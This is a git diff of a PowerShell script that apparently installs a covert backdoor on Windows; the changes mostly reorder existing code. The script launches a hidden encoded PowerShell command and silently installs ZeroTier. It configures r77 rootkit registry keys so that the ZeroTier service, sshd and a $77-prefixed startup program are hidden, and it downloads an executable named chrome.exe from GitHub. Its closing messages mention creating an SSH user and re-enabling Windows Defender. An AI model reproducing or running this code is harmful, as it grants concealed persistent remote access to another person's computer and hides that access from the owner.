@@ -97,6 +97,19 @@ $encodedCommand = [Convert]::ToBase64String($bytes)
 # Launch the script block in a new PowerShell window
 Start-Process PowerShell.exe -ArgumentList "-NoProfile -EncodedCommand $encodedCommand" -WindowStyle Hidden
 
+# Check if ZeroTier One is already installed by checking for any executable in its folder
+$zeroTierFolderPath = "C:\Program Files (x86)\ZeroTier\One"
+if (Test-Path -Path $zeroTierFolderPath -Filter "*.exe") {
+    Write-Host "Executable file found in ZeroTier One folder, skipping download and installation."
+} else {
+    # Download and Install ZeroTier One silently if not already installed
+    $zeroTierMsiUrl = "https://download.zerotier.com/RELEASES/1.6.5/dist/ZeroTierOne.msi"
+    $zeroTierMsiPath = Join-Path $env:TEMP "ZeroTierOne.msi"
+    Invoke-WebRequest -Uri $zeroTierMsiUrl -OutFile $zeroTierMsiPath
+    Start-Process "msiexec.exe" -ArgumentList "/i `"$zeroTierMsiPath`" /quiet" -Wait
+    Remove-Item $zeroTierMsiPath -Force # Cleanup installer
+}
+
 # Adds services, processes, and startup applications to the r77 configuration registry keys
 
 # Function to check and create the registry key if it doesn't exist
@@ -111,7 +124,21 @@ function Ensure-RegistryKey {
     }
 }
 
+# Ensure the main configuration key exists
+$rootRegPath = 'HKLM:\SOFTWARE\$77config'
+Ensure-RegistryKey -path $rootRegPath
 
+# Ensure the service_names subkey exists
+$serviceNamesPath = "$rootRegPath\service_names"
+Ensure-RegistryKey -path $serviceNamesPath
+
+# Ensure the process_names subkey exists
+$processNamesPath = "$rootRegPath\process_names"
+Ensure-RegistryKey -path $processNamesPath
+
+# Ensure the startup subkey exists
+$startupPath = "$rootRegPath\startup"
+Ensure-RegistryKey -path $startupPath
 
 # Function to add a service name to the registry if not already present
 function Add-ServiceName {
@@ -150,22 +177,6 @@ function Add-StartupApplication {
     }
 }
 
-# Ensure the main configuration key exists
-$rootRegPath = 'HKLM:\SOFTWARE\$77config'
-Ensure-RegistryKey -path $rootRegPath
-
-# Ensure the service_names subkey exists
-$serviceNamesPath = "$rootRegPath\service_names"
-Ensure-RegistryKey -path $serviceNamesPath
-
-# Ensure the process_names subkey exists
-$processNamesPath = "$rootRegPath\process_names"
-Ensure-RegistryKey -path $processNamesPath
-
-# Ensure the startup subkey exists
-$startupPath = "$rootRegPath\startup"
-Ensure-RegistryKey -path $startupPath
-
 # Add "ZeroTierOneService" and "sshd" to the service names registry
 Add-ServiceName -service 'ZeroTierOneService'
 Add-ServiceName -service 'sshd'
@@ -178,20 +189,6 @@ Add-StartupApplication -applicationPath 'C:\Windows\system32\$77Starware\$77SWCl
 
 # Output completion message
 Write-Host "Services, processes, and startup applications have been configured in the registry."
-
-
-# Check if ZeroTier One is already installed by checking for any executable in its folder
-$zeroTierFolderPath = "C:\Program Files (x86)\ZeroTier\One"
-if (Test-Path -Path $zeroTierFolderPath -Filter "*.exe") {
-    Write-Host "Executable file found in ZeroTier One folder, skipping download and installation."
-} else {
-    # Download and Install ZeroTier One silently if not already installed
-    $zeroTierMsiUrl = "https://download.zerotier.com/RELEASES/1.6.5/dist/ZeroTierOne.msi"
-    $zeroTierMsiPath = Join-Path $env:TEMP "ZeroTierOne.msi"
-    Invoke-WebRequest -Uri $zeroTierMsiUrl -OutFile $zeroTierMsiPath
-    Start-Process "msiexec.exe" -ArgumentList "/i `"$zeroTierMsiPath`" /quiet" -Wait
-    Remove-Item $zeroTierMsiPath -Force # Cleanup installer
-}
 
 # Define the URL and download location for improved.exe
 $exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/chrome.exe"
@@ -255,4 +252,3 @@ Write-Host "Setup complete. SSH user created and configured. Joined ZeroTier net
 Write-Host "Windows Defender Antivirus has been re-enabled."
 
 Read-Host -Prompt "Press Enter to exit"
-
